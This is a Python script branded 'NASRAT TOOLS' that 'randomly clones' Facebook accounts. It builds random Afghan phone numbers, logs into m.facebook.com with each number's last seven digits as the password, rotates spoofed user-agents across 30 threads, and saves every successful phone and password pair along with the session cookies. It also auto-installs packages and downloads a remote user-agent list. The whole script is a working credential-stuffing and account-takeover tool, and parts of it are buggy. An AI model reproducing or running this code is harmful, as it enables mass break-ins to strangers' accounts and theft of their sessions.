#given by mueor
#join telegram for more script
#link t.me/mueorb
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Kashif.py')
from bs4 import BeautifulSoup
ugen = []
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
GREEN = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
KB = '{ KB }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
#sock=open('ua.html','r').read().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').read().splitlines()
loop = 0
cps = []
oks = []
twf = [] 

def clear():
    os.system('clear')
logo =("""\033[1;92m
                      \x1b[97m[\033[37;41m  WELCOME TO NASRAT TOOLS   \033[0;m]
\033[1;92m
    dMP dMP     .aMMMb     dMP     dMP dMP     .aMMMb     dMMMMb     
   dMP.dMP     dMP"dMP    amr     dMP dMP     dMP"dMP    dMP dMP     
  dMMMMK"     dMMMMMP    dMP     dMMMMMP     dMMMMMP    dMP dMP      
 dMP"AMF     dMP dMP    dMP     dMP dMP     dMP dMP    dMP dMP       
dMP dMP     dMP dMP    dMP     dMP dMP     dMP dMP    dMP dMP        
                                    
[*]----------------------------------------------[*]
 \033[1;91m|     \033[1;91m[🔥] NUMBER \33[0;m      :\033[1;91m 0786842799             |
 \033[1;92m|     \033[1;92m[🔥] FACEBOOK     :\033[1;92m Nasrat hack       |
 \033[1;93m|     \033[1;93m[🔥] GITHUB       :\033[1;93m Nasrat-hack              |
 \033[1;94m|     \033[1;94m[🔥] TOOL STATUS  :\033[1;94m ACTIVE FREE            |
 \033[1;95m|     \033[1;95m[🔥] TOOL VIRSION :\033[1;95m 0.1                    |
 \033[1;96m|     \033[1;96m[🔥] WATSAPP      : \033[1;96m+93786842799           |
\033[1;92m[*]----------------------------------------------[*]
   \033[1;97m  (Use AirPlaNe MooD For More SpEED) \033[1;97m
\033[1;92m[*]----------------------------------------------[*]""" )

 
#####     #### 

def linex():
    print(f'==========================================================')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mKB-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mKB-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ðŸŽ®%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[NASRAT] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ðŸŽ®%s'%(ORANGE))
    else:
        print(f'\r ðŸŽ®  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[Rahi]---------------------------------------------------[Rahi]")
    #____________#
def RAHI():
    #os.system("play-audio WELCOME_TO_kb_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f"[1] {GREEN}START RANDOM CLONING")
    print(f"[2] {GREEN}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
    Kashif = input("[Rahi] CHOOSE : ")
    if Kashif in ["1","1"]:
        Random()
    elif Kashif in ["0","2"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()

#_____________#
 
#_____________________#

def Random():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(logo)
    print(f"")
    linex()
    print(f"")
    print(' 074 ,079,077 ,078')
    print(f"")
    print(f" ")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[93m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        clear()       
        tl = str(len(user))
        print(logo)
        print(f" {GREEN}TOTAL IDZ             : {RED}"+tl)
        print(f" {GREEN}COUNTRY YOU CHOOSE    : AFGHANISTAN ")
        print(f" {GREEN}NUMBER YOU PUT        : {RED}"+code)
        print(f" {GREEN}PROCESS HAS BEEN STARTED")
        print(f" {GREEN}BE PATIENT.......")
        print(f" {GREEN}TO STOP PROCESS Ctrl + Z ")
        print(f'===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([ugen])
            session = requests.Session()
            sys.stdout.write(f'\r[\033[1;97mKAIHAN\033[1;97m] %s|\033[1;92mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            "method": 'GET',         
            "scheme": 'https',
            'accept': '*/*',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '3.4000000953674316',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"SH-03K"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1', 
            'viewport-width': '980',
            'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(48*'')
                cid = coki[151:166]
                print('\033[1;92m[KAIHANOK] '+uid+' | '+ps+'\n\033[1;93mCOOKIE[]=\033[1;92m'+coki+   '  ''  \033[0;92m');print(50*'\033[1;92m')
                open('NASRAT -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            #elif #'checkpoint' in log_cookies:
                #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #cid = coki[141:152]
                #print('\033[1;31m[] '+uid+' | '+ps+'\x1b[1;31m\33[1;31m');print(48*'')
                #open('/sdcard/NASRAT-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass

        
 
if __name__ == '__main__':
    RAHI()